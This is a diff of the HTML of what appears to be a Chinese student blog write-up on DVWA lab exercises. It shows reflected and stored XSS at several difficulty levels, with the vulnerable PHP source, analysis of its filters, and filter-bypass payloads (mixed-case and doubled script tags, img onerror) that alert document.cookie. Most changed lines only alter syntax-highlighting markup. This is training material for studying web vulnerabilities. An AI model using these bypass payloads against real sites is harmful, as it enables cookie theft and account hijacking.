@@ -765,7 +765,7 @@ python2 sqlmap.py -u <span class="hljs-string">&quot;http://10.5.8.66/dvwa/vulne
 &#125;
 
 <span class="hljs-comment">// Generate Anti-CSRF token</span>
-generateSessionToken();
+<span class="hljs-title function_ invoke__">generateSessionToken</span>();
 
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
@@ -775,10 +775,10 @@ generateSessionToken();
 
 <h2 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS (Reflected)"></a>XSS (Reflected)</h2><h3 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);
+<span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);
 
 <span class="hljs-comment">// Is there any input?</span>
-<span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;
+<span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;
     <span class="hljs-comment">// Feedback for end user</span>
     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;
 &#125;
@@ -787,45 +787,45 @@ header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);
 
 <p> 可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞 。</p>
 <p>先测试一下</p>
-<div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&quot;xss&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>
+<div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>
 
-<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026202557058.png" srcset="/img/loading.gif" alt="image-20201026202557058"></p>
+<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/Users\Sunzh\AppData\Roaming\Typora\typora-user-images\image-20201026202557058.png" srcset="/img/loading.gif" alt="image-20201026202557058"></p>
 <p>获取cookie</p>
-<div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>
+<div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>
 
-<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026202647823.png" srcset="/img/loading.gif" alt="image-20201026202647823"></p>
+<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/Users\Sunzh\AppData\Roaming\Typora\typora-user-images\image-20201026202647823.png" srcset="/img/loading.gif" alt="image-20201026202647823"></p>
 <h3 id="medium-3"><a href="#medium-3" class="headerlink" title="medium"></a>medium</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);
+<span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);
 <span class="hljs-comment">// Is there any input?</span>
-<span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;
+<span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;
     <span class="hljs-comment">// Get input</span>
-    <span class="hljs-variable">$name</span> = str_replace( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );
+    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );
     <span class="hljs-comment">// Feedback for end user</span>
     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;
 &#125;
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
-<p>代码审计后可以发现是对输入的内容进行了过滤，将<strong>&lt;script&gt;</strong>替换为空，可以双写绕过，也可以大小写绕过。</p>
+<p>代码审计后可以发现是对输入的内容进行了过滤，将**&lt;script&gt;**替换为空，可以双写绕过，也可以大小写绕过。</p>
 <p>构造payload：</p>
-<div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
 
-&lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">ipt&gt;alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+&lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">ipt&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
 //使用其他标签
 <span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span></code></pre></div>
 
 <p><img src="https://i.loli.net/2020/11/05/tzosymv7d1Sru3e.png" srcset="/img/loading.gif" alt="xssmid.png"></p>
 <h3 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);
+<span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);
 <span class="hljs-comment">// Is there any input?</span>
-<span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;
+<span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;
     <span class="hljs-comment">// Get input</span>
-    <span class="hljs-variable">$name</span> = preg_replace( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );
+    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );
     <span class="hljs-comment">// Feedback for end user</span>
     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;
 &#125;
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
-<p>先代码审计，执行一个正则表达式的搜索和替换,其中 <code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> 是正则表达式 <code>(.*)</code> 表示贪婪匹配，<code>/i</code> 表示不区分大小写所以在High级别的代码中，所有关于  <code>&lt;script&gt;</code> 标签均被过滤删除了 ,可以使用其他的标签。</p>
+<p>先代码审计，执行一个正则表达式的搜索和替换,其中 <code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code> 是正则表达式 <code>(.*)</code> 表示贪婪匹配，<code> /i</code> 表示不区分大小写所以在High级别的代码中，所有关于  <code>&lt;script&gt; </code> 标签均被过滤删除了 ,可以使用其他的标签。</p>
 <p>构造payload：</p>
 <div class="hljs"><pre><code class="hljs routeros">&lt;IMG <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;</code></pre></div>
 
@@ -834,107 +834,107 @@ header (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);
 
 <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;
     <span class="hljs-comment">// Get input</span>
-    <span class="hljs-variable">$message</span> = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );
-    <span class="hljs-variable">$name</span>    = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );
+    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );
+    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );
 
     <span class="hljs-comment">// Sanitize message input</span>
-    <span class="hljs-variable">$message</span> = stripslashes( <span class="hljs-variable">$message</span> );
-    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
+    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );
+    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
 
     <span class="hljs-comment">// Sanitize name input</span>
-    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
+    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
 
     <span class="hljs-comment">// Update database</span>
     <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;
-    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );
+    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );
 
     <span class="hljs-comment">//mysql_close();</span>
 &#125;
 
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
-<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p> <code>isset()</code> 函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false </p>
-<p> <code>trim()</code> 函数作用为移除字符串两侧空白字符或其他预定义字符 </p>
-<p> <code>stripslashes()</code> 函数用于删除字符串中的反斜杠 </p>
-<p> <code>mysqli_real_escape_string()</code> 函数会对字符串中的特殊号<code>(\x00，\n，\r，\，&#39;，&quot;，\x1a)</code> 进行转义 </p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p> <code>isset() </code> 函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true&#x2F;false </p>
+<p> <code>trim() </code> 函数作用为移除字符串两侧空白字符或其他预定义字符 </p>
+<p> <code>stripslashes() </code> 函数用于删除字符串中的反斜杠 </p>
+<p> <code>mysqli_real_escape_string() </code> 函数会对字符串中的特殊号<code>(\x00，\n，\r，\，&#39;，&quot;，\x1a) </code> 进行转义 </p>
 <p> 在代码中对message，name输入框内容  没有进行XSS方面的过滤和检查 </p>
-<p> 且通过  <code>query</code> 语句插入到数据库中。所以存在存储型XSS漏洞 </p>
+<p> 且通过  <code>query </code> 语句插入到数据库中。所以存在存储型XSS漏洞 </p>
 <p>这里name ,message的输入框中都存在xss，所以两个位置都可以使用，但是name位置有字数限制，可以使用bp抓包修改</p>
-<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026203331497.png" srcset="/img/loading.gif" alt="image-20201026203331497"></p>
-<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026203255791.png" srcset="/img/loading.gif" alt="image-202010262032"></p>
+<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/Users\Sunzh\AppData\Roaming\Typora\typora-user-images\image-20201026203331497.png" srcset="/img/loading.gif" alt="image-20201026203331497"></p>
+<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/Users\Sunzh\AppData\Roaming\Typora\typora-user-images\image-20201026203255791.png" srcset="/img/loading.gif" alt="image-202010262032"></p>
 <p>由于是存储型XSS,所以每次刷新页面都会弹出cookie。</p>
 <h3 id="medium-4"><a href="#medium-4" class="headerlink" title="medium"></a>medium</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
 <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;
     <span class="hljs-comment">// Get input</span>
-    <span class="hljs-variable">$message</span> = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );
-    <span class="hljs-variable">$name</span>    = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );
+    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );
+    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );
 
     <span class="hljs-comment">// Sanitize message input</span>
-    <span class="hljs-variable">$message</span> = strip_tags( addslashes( <span class="hljs-variable">$message</span> ) );
-    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
-    <span class="hljs-variable">$message</span> = htmlspecialchars( <span class="hljs-variable">$message</span> );
+    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );
+    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
+    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );
 
     <span class="hljs-comment">// Sanitize name input</span>
-    <span class="hljs-variable">$name</span> = str_replace( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );
-    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
+    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );
+    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
 
     <span class="hljs-comment">// Update database</span>
     <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;
-    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );
+    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );
 
     <span class="hljs-comment">//mysql_close();</span>
 &#125;
 
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
-<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$message</span> = strip_tags( addslashes( <span class="hljs-variable">$message</span> ) );
-<span class="hljs-variable">$message</span> = htmlspecialchars( <span class="hljs-variable">$message</span> );
-<span class="hljs-variable">$name</span> = str_replace( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );</code></pre></div>
+<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );
+<span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );
+<span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );</code></pre></div>
 
-<p> <code>strip_tags()</code> 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 <code>&lt;b&gt;</code> 标签。 </p>
-<p> <code>addslashes()</code> 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 </p>
-<p> <code>htmlspecialchars()</code> 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 </p>
+<p> <code>strip_tags() </code> 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 <code>&lt;b&gt;</code> 标签。 </p>
+<p> <code>addslashes() </code> 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 </p>
+<p> <code>htmlspecialchars() </code> 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 </p>
 <p> 对message输入内容进行检测过滤，因此无法再通过message参数注入XSS代码</p>
 <p>但是对于name参数，只是简单过滤了<code>&lt;script&gt;</code>字符串，仍然存在存储型的XSS，与反射型中级的一样的方法</p>
 <p>payload</p>
